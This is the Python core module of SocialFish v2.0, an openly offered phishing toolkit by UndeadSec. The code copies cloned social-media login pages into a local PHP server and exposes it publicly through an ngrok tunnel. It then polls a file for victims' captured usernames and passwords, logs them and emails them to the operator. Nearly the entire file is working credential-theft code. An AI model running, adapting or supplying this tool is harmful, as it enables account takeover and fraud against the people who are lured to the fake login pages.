######################################################
#                                                    #
#       SOCIALFISH v2.0                              #
#                                                    #
# by:     UNDEADSEC                                  #
#                                                    #
# Telegram Group: https://t.me/UndeadSec             #
# YouTube Channel: https://youtube.com/c/UndeadSec   #
# Twitter: https://twitter.com/A1S0N_                #
#                                                    #
######################################################

from contextlib import contextmanager
import json
import multiprocessing
import requests
import os
from time import sleep
from huepy import *
import subprocess
from core.email import send_mail
from core.credentials import credentials
from smtplib import SMTPSenderRefused, SMTPServerDisconnected
from time import strftime

def runPhishing(social, custom):
    global _social
    _social = social
    os.system('rm -Rf base/Server/www/*.* && touch base/Server/www/cat.txt')   
    command = 'cp base/WebPages/%s/*.* base/Server/www/' % social.lower()
    os.system(command)
    with open('base/Server/www/login.php') as f:
        read_data = f.read()   
    c = read_data.replace('<CUST0M>', custom)
    f = open('base/Server/www/login.php', 'w')
    f.write(c)
    f.close()

def waitCreds():
    print(cyan(" [*] Waiting for credentials... "))
    while True:
        with open('base/Server/www/cat.txt') as creds:
            lines = creds.read().rstrip()
        if len(lines) != 0:
            print(green('\n [*] Credentials found:\n %s' % lines))
            os.system('rm -rf base/Server/www/cat.txt && touch base/Server/www/cat.txt')
            try:
                credentials(lines.split('\n'), _social)
                send_mail(lines.split('\n'),_social)
            except NameError:
                pass         
            except SMTPSenderRefused:
                print(red(' [!] Sorry, sender refused :('))
                pass
            except SMTPServerDisconnected:
                pass

@contextmanager
def runServer(port: int):
    def php_process():
        os.system("cd base/Server/www/ && php -n -S 127.0.0.1:%d > /dev/null 2>&1 &" % port)
    php_process = multiprocessing.Process(target=php_process)
    php_process.start()
    yield php_process
    php_process.terminate()
    php_process.close()

@contextmanager
def ngrok_start(port: int):
    ngrok_process = subprocess.Popen(
        ['./base/Server/ngrok','http','%s' % port], 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE
    )
    while True:
        try:
            ngrok_url = requests.get('http://127.0.0.1:4040/api/tunnels/command_line')
            if ngrok_url.status_code == 200:
                public_url = json.loads(ngrok_url.text)['public_url']
                print(green(' [~] Ready to Phishing'))
                print(lightgreen(' [*] Ngrok URL: %s' % public_url))
                print(green(' [~] Your logs are being stored in: Logs/{}').format(_social + strftime('-%y%m%d.txt')))
                print(yellow(' [^] Press Ctrl+C or VolDown+C(android) to quit'))
                yield public_url
                break
        except requests.exceptions.ConnectionError:
            sleep(.5)
    os.kill(ngrok_process.pid, 15)

def PhishingServer(port: int=1449):
    with ngrok_start(port) as ngrok:
        with runServer(port) as php:
            waitCreds()
